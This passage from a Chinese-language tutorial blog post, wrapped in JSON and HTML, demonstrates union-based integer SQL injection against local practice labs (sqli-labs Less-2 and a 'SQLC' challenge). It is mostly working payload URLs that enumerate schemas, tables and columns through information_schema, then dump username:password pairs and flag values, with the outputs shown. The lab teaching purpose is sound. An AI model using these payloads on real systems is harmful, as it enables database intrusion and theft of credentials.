class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p>可以看到，原本占位符2所在的位置，已经被一组输出内容所替换。</p>\n<p><img src=\"image-20220928230746841.png\" alt=\"image-20220928230746841\"></p>\n<p>除了group_concat()，我们还可以使用：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#输出当前使用数据库的名称</span><br><span class=\"line\">database() </span><br><span class=\"line\">#输出当前服务器中使用数据库的用户的名字和其对应的主机</span><br><span class=\"line\"><span class=\"keyword\">user</span>()</span><br><span class=\"line\">#输出当前数据库版本号</span><br><span class=\"line\">version()</span><br><span class=\"line\">#输出该服务器数据库安装路径（数据库安装在哪里）</span><br><span class=\"line\">@<span class=\"variable\">@basedir</span></span><br><span class=\"line\">#输出数据库中数据的存放路径（该存放路径下有各个数据库的数据、数据库中表的数据）</span><br><span class=\"line\">@<span class=\"variable\">@datadir</span></span><br><span class=\"line\">#输出操作系统的版本号</span><br><span class=\"line\">@<span class=\"variable\">@version</span>_compile_os</span><br><span class=\"line\">#md5(str)可以对传入的字符串进行，d5加密，并返回加密后得到的<span class=\"number\">32</span>位字符串。</span><br><span class=\"line\">md5(<span class=\"string\">&#x27;xxxx&#x27;</span>)</span><br><span class=\"line\">#使用某个拼接符如“:”来拼接str1和str2</span><br><span class=\"line\">concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, str1, str2)</span><br></pre></td></tr></table></figure>\n<p>接着我们查询所在数据库的名字：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(schema_name), database() <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p>哦，原来是在security数据库中</p>\n<p><img src=\"image-20220928231402676.png\" alt=\"image-20220928231402676\"></p>\n<h4 id=\"3）确定想从某个库中拿到什么表，从表中拿到什么列\"><a href=\"#3）确定想从某个库中拿到什么表，从表中拿到什么列\" class=\"headerlink\" title=\"3）确定想从某个库中拿到什么表，从表中拿到什么列\"></a>3）确定想从某个库中拿到什么表，从表中拿到什么列</h4><p>我们看看从security库中都可以读取什么表？</p>\n<p><strong>核心</strong>——在<strong>information_schema库</strong>的<strong>Tables表</strong>中，查询当table_schema的值为我们刚刚获取的security库时 </p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(table_name), database() <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema <span class=\"operator\">=</span> database() #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928231639522.png\" alt=\"image-20220928231639522\"></p>\n<p><strong>获取到security库中的所有表为</strong>：<code>emails</code>、<code>referers</code>、<code>uagents</code>、<code>users</code></p>\n<p>我们比较关心账号密码相关，所以眼光聚焦到users表。</p>\n<p><strong>核心</strong>——在<strong>information_schema库</strong>的<strong>Columns表</strong>中，查询当<strong>table_schema</strong>的值为我们刚刚获取的<code>security</code> 且 <strong>table_name</strong>为<code>users</code>时</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(column_name), database() <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_schema <span class=\"operator\">=</span> database() <span class=\"keyword\">and</span> table_name <span class=\"operator\">=</span> <span class=\"string\">&#x27;users&#x27;</span> #</span><br></pre></td></tr></table></figure>\n<p><strong>获取到security库中，users表里所有列为</strong>：<code>id</code>、<code>username</code>、<code>password</code></p>\n<p><img src=\"image-20220928232355430.png\" alt=\"image-20220928232355430\"></p>\n<p>我们想要获取username 和 password的全部对应关系，使用concat_ws函数，把username和password用冒号拼接起来：</p>\n<p><strong>核心</strong>——由于已经知道了所在<strong>security库</strong>，<strong>users表</strong>，因此直接<code>select xxxx from security.users</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, username, password)), <span class=\"number\">3</span> <span class=\"keyword\">from</span> security.users #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928232842359.png\" alt=\"image-20220928232842359\"></p>\n<p>小练习</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">1.</span>查看注入类型</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-1.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-1.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; # 报错(整型和单引号都会报错)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#2.确定整型注入</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=1 # (只有整型不会报错)</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#3.确定列数</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=1 union select 1, 2, 3 #</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#4.构造联合查询,确定所在库名。</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), schema_name from information_schema.schemata #</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: information_schema</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#5.确定在这个库中，都有什么表</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(table_name) from information_schema.tables where table_schema = database()#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: emails,flag,users</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#6.确定我们要找flag表，并看这个表中有什么列</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;</span>flag<span class=\"string\">&#x27;#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: flag,value</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#7.取列的值，另外把查询的from 后面改成对应的&quot;库.表&quot;</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=2356 union select 1,database(), group_concat(concat_ws(&#x27;</span>:<span class=\"string\">&#x27;, flag, value)) from challenge.flag#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:any,flag8:sqlc,flag9:tasi,flag10:moo,flag12:false,flag11:muse</span></span><br></pre></td></tr></table></figure>\n<p>至此，整型注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        }
    ]
}